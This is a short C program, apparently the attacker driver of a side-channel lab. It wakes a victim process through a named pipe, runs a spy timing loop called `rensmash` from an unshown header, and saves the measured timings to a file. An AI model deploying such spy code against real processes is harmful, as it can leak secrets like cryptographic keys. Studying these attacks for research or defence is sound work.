#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include "attacker.h" 

int main(void) {
    // 1) Wake victim
    uint8_t *zeroes = calloc(ZERO_COUNT, 1);
    assert(zeroes != NULL);

    FILE *pipe = fopen(SPY_PIPE, "wb");
    assert(pipe != NULL);

    size_t written = fwrite(zeroes, 1, ZERO_COUNT, pipe);
    assert(written == ZERO_COUNT);

    fclose(pipe);
    free(zeroes);

    // 2) Allocate timing buffer
    uint64_t *timings = calloc(SPY_NUM_TIMINGS, sizeof(uint64_t));
    assert(timings != NULL);

    // 3) Run spy loop
    rensmash(timings);

    // 4) Dump timings.bin
    FILE *fp = fopen("timings.bin", "wb");
    assert(fp != NULL);

    size_t ret = fwrite(timings, sizeof(uint64_t), SPY_NUM_TIMINGS, fp);
    assert(ret == SPY_NUM_TIMINGS);

    fclose(fp);
    free(timings);

    return 0;
}
